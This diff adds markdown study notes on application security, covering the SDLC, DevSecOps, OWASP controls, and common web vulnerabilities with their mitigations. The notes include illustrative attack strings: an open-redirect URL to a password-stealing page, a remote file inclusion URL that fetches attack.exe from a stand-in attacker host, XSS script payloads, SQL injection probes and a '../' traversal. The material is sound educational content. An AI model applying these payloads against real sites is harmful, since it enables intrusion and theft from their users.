@@ -1,0 +1,199 @@
+## application security
+
+- software development life cycle (SDLC)
+	- describes steps for software development throughout its life
+	- idea -> requirements gathering -> analysis to design, code, tests, rollout
+	- once software is in production, user training, maintenance, and decommissioning 
+	- actual phases
+		- planning
+		- requirements definition
+			- what is desired functionality, what improvements are desired, what do current systems do / don't do
+		- design
+			- design for functionality, architecture, integration points and techniques, dataflows, business processes, etc
+		- coding
+			- coding
+			- unit testing
+		- testing
+			- integration tests
+			- connecting to outside data sources, etc
+			- user acceptance testing (UAT) ensures users are satisfied 
+		- training and transition 
+			- ensuring end users are trained on the software 
+			- ensure the software is in general use
+		- operations and maintenance
+			- patching, updating, minor modifications, general support
+		- decommissioning
+			- shutting down old products, properly disposing data
+	- code deployment environments
+		- development env: where devs do their work
+		- test env: where software can be tested w/o impacting systems 
+			- QA takes place here
+		- staging environment: transition env for code that has cleared testing and is waiting to be deployed into prod
+		- production env: live system
+- devops / devsecops
+	- devops: optimizing SDLC by using toolchains (collections of tools)
+		- toolchains include tools assisting w/ coding, building, testing, packaging, releasing, and configuring monitoring software
+	- devsecops: adding security
+- continuous integration / continuous deployment (or delivery) (CI/CD)
+	- ![Pasted image 20240830163835](https://github.com/user-attachments/assets/1ad3c422-0c45-4e94-ba51-de65d1280142)
+	- CI: consistently checking code into a shared repo 
+	- CD: rolls out tested changes into prod automatically once its been tested
+	- also needs continuous validation in the pipeline testing process, which involves continuous monitoring, logging, and reporting
+- designing and coding for security
+	- secure coding practices
+		- OWASP proactive controls
+			- define security requirements 
+			- leverage security frameworks and libraries
+			- secure db access
+			- encode and escape data (no special characters)
+			- validate all inputs
+			- implement digital identity (MFA, session handling, etc)
+			- enforce access controls (deny by default, principle of least privilege)
+			- protect data everywhere (encryption)
+			- security logging + monitoring
+			- handle errors and exceptions
+	- API security
+		- use authentication, authorization, proper data scoping, rate limiting, input filtering, logging
+- software security testing
+	- static code analysis
+		- reviewing code w/o running the program
+	- dynamic code analysis
+		- executing code w/ input to test
+	- fuzzing
+		- sending invalid / random data to see if a program can handle it 
+- injection vulns
+	- SQL injection
+		- blind SQL injection: conducting a SQL injection w/o being able to see the results of a query
+		- blind content based SQL injection
+			- sends input to the webapp that checks if the app is interpreting injected code 
+				- ex: if you put '1=2; at the end and it returns nothing, while '1=1; returns something, it is probably running your queries
+		- blind timing based SQL injection
+			- using the time required to process a query as a way to retrieve info from a db
+	- code injection attacks
+		- seek to insert attacker-written code into legit code
+		- LDAP injection attack
+		- XML injection attack
+		- DLL injection attack
+		- XSS
+	- command injection attacks
+		- when you inject input into a command that runs on the os 
+- authentication vulns
+	- breaking password auth 
+		- social engineering
+		- eavesdropping thru unencrypted network
+		- brute forcing passwords from previous password dumps
+	- session attacks
+		- session hijacking: steal an existing authenticated session
+		- most websites use cookies embedded in an HTTP header for auth
+		- several ways to steal a cookie:
+			- eavesdropping on an unencrypted network and stealing a copy of the cookie
+			- using malware to retrieve cookies
+			- on path attack: attacker fools user into thinking the attacker is the real website, then using their credentials to auth to the actual website and using the cookies 
+		- session replay attack: manipulating cookie to alter the details sent to the website or use the cookie to access the website 
+		- to help mitigate, mark cookies with `SECURE` attribute, which means cookies will only be transmitted on HTTPS
+		- pass the hash attack: another form of replay attack against the OS, where they harvest NTLM (a Microsoft security protocol) hashes to gain access
+	- unvalidated redirects
+		- URL redirects: when browsers pass destination urls in the url 
+			- `http://www.mycompany.com/ordering.php?redirect=http%3a//www.mycompany.com/thankyou.htm`
+		- however, if you can redirect to any URL, it could be an unvalidated redirect, where you could get redirected to a malicious website
+			- `http://www.mycompany.com/ordering.php?redirect=http%3a//www.evilhacker.com/passwordstealer.htm`
+			- here, you'd finish ordering at mycompany.com and then get redirected to evilhacker.com
+		- to mitigate: validated redirects
+			- check redirection URLs against an approved list 
+- authorization vulns 
+	- insecure direct object references
+		- viewing information that exceeds their authority
+		- ex: you should only be able to view `http://www.mycompany.com/getDocument.php?documentID=1842` but can also view `http://www.mycompany.com/getDocument.php?documentID=1841`because they didn't check authentication
+	- directory traversal
+		- when a user can navigate a directory structure of a web server
+		- ../
+	- file inclusion
+		- attack where you execute code on a web server (similar to directory traversal)
+		- local file inclusion: execute code stored in a file somewhere on the web server
+		- remote file inclusion: execute code stored on a remote server
+			- ex: `http://www.mycompany.com/app.php?include=http://evil.attacker.com/attack.exe`
+		- attackers will usually upload a web shell to the server 
+	- privilege escalation
+		- increases level of access an attacker has to a target system
+- web app vulns
+	- XSS (cross site scripting)
+		- occur when attacker performs HTML injection
+		- reflected XSS
+			- occur when application allows reflected input
+				- ex: "submit your name" -> *hello, name*
+				- `Mike<script>alert("hello")</script>`
+			- dangerous bc form input can be embedded in a URL 
+			- mitigate w/ input validation
+		- stored / persistent XSS
+			- store XSS code on a remote web server (such as in a forum post)
+			- ex: `Does anyone have suggestions for transportation? <script>alert("hello")</script>`
+			- when other users load the post, the script will load
+	- request forgery
+		- when users unwittingly execute commands against a remote server
+		- CSRF (cross site request forgery)
+			- exploit the trust remote sites have in a user's system to execute commands on the user's behalf 
+			- attacker embeds code in one website that sends a command in another website (which the attacker hopes they are logged into)
+			- ex: someone posts a link on a forum, which goes to a bank and funnels money from it (so if the user was logged in, it would work)
+			- mitigate by using secure / random tokens in the url; check location of referring URL 
+		- SSRF (server side request forgery)
+			- similar, but they trick a server into a URL based on user-supplied input 
+			- if server has access to nonpublic URLs, you can exploit that to show info
+- application security controls
+	- input validation
+		- allow listing: dev describes exact input expected
+		- deny listing: describe input that should be blocked
+		- parameter pollution: adding multiple parameters to see if webapp only checks first parameter
+	- web application firewalls (WAFs)
+		- sits in front of application / web server and performs input validation before passing input to web server 
+	- parameterized queries
+		- client doesn't directly send SQL code to db; client sends args to server, which inserts them into a query template 
+	- sandboxing
+		- running app in isolated / controlled environment 
+- code security
+	- code signing
+		- confirm authenticity of their code to end users w/ a signed key 
+		- protects against malicious updates
+	- code reuse
+		- be vigilant in how third party code is used in an org 
+	- software diversity
+		- avoid single points of failure (like a single piece of source code, binary file, etc)
+	- integrity management
+		- use hashing to ensure prod code and dev code is the same
+	- application resilience 
+		- scalability: computing resources can be incrementally added to support increasing demand
+		- elasticity: applications should be able to provision resources to scale when necessary and deprovision when not needed
+- secure coding practices
+	- source code comments
+		- make sure commented versions of code stay secret
+	- error handling
+	- hard coded credentials are bad
+	- package monitoring
+		- keep track and update third party packages 
+- memory management
+	- resource exhaustion
+		- memory leaks
+			- when a program fails to return unnecessary memory
+	- pointer dereferencing
+		- dereferencing null pointer could cause program to crash or allow someone to bypass security controls
+	- buffer overflows
+	- race conditions
+		- race conditions occur when security depends on a sequence of events happening
+		- time of check: instance when system verifies access permissions or other security controls
+		- time of use: moment when system accesses the resource / uses a granted permissions
+		- target of evaluation: the component / system / mechanism being tested
+		- Time-of-Check-to-Time-of-Use (TOCTTOU or TOC/TOU) issue: type of race condition, occurs when a program checks access permission too far ahead of a resource request 
+			- ex: a permission gets removed when user restarts computer; user just needs to never restart computer
+	- unprotected APIs
+- automation and orchestration
+	- SOAR: security orchestration, automation, and response 
+	- SOAR platforms help you automate security tasks
+	- use cases of automation and scripting
+		- user provisioning, resource provisioning, security groups, ticket creation, integration / APIs
+	- benefits of automation and scripting
+		- efficiency, securely scaling, etc
+	- other considerations
+		- complexity
+		- cost
+		- single pt of failure
+		- technical debt
+		- ongoing supportability
